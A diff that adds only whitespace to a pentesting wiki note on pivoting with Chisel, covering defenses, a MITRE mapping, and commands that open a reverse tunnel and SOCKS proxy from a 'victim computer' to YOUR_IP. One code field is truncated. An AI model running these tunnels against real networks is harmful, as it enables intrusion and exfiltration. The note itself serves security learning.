@@ -39,11 +39,15 @@ Technically, Chisel works by establishing a connection between two systems and f
 
 From a business perspective, this technique highlights the importance of network segmentation and access control. By limiting network access to only those who require it, an organization can reduce the risk of lateral movement and data exfiltration.
 
+ 
+
 ## Requirements
 
 1. Access to a system within the target network
 
 1. Chisel tool installed on both the attacker and target systems
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ From a business perspective, this technique highlights the importance of network
 1. Monitor network traffic for signs of port forwarding or SOCKS proxying
 
 1. Use endpoint detection and response (EDR) tools to detect and respond to suspicious activity
+
+ 
 
 ## Objectives
 
@@ -63,15 +69,25 @@ From a business perspective, this technique highlights the importance of network
 
 1. Exfiltrate sensitive data
 
+ 
+
 # Instructions
 
 1. To use this command, first install Chisel by running 'go get -v github.com/jpillora/chisel'. Then, to forward ports 389 and 88 to the hacker computer, run '/opt/chisel/chisel server -p 8008 --reverse' on the hacker computer and 'chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389' on the victim computer. To use SOCKS proxy, run 'chisel.exe client YOUR_IP:8008 R:socks' on the victim computer.
+
+ 
+
+
 
 **Code**: [[go get -v github.com/jpillora/chisel
 
 # forward po]]
 
+
+
 > The 'chisel' command is used to create a tunnel between two computers, allowing for port forwarding and SOCKS proxy. The 'go get' command is used to install Chisel. The 'chisel server' command is used to start the server on the hacker computer. The 'chisel client' command is used to connect the victim computer to the server and forward ports or create a SOCKS proxy. The 'R' flag is used to specify the remote port and destination. In the example above, port 88 is forwarded to 127.0.0.1:88 and port 389 is forwarded to localhost:389. The 'socks' flag is used to create a SOCKS proxy.
+
+
 
 **Command** ([[Install chisel]]):
 
@@ -79,11 +95,19 @@ From a business perspective, this technique highlights the importance of network
 go get -v github.com/jpillora/chisel
 ```
 
+
+
+
+
 **Command** ([[Forward ports to hacker computer]]):
 
 ```bash
 /opt/chisel/chisel server -p 8008 --reverse
 ```
+
+
+
+
 
 **Command** ([[Connect to chisel server]]):
 
@@ -91,11 +115,17 @@ go get -v github.com/jpillora/chisel
 .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389
 ```
 
+
+
+
+
 **Command** ([[Create SOCKS proxy]]):
 
 ```bash
 .\chisel.exe client YOUR_IP:8008 R:socks
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -120,3 +150,5 @@ go get -v github.com/jpillora/chisel
 
 - [[chisel]]
 - [[Network Pivoting Techniques]]
+
+
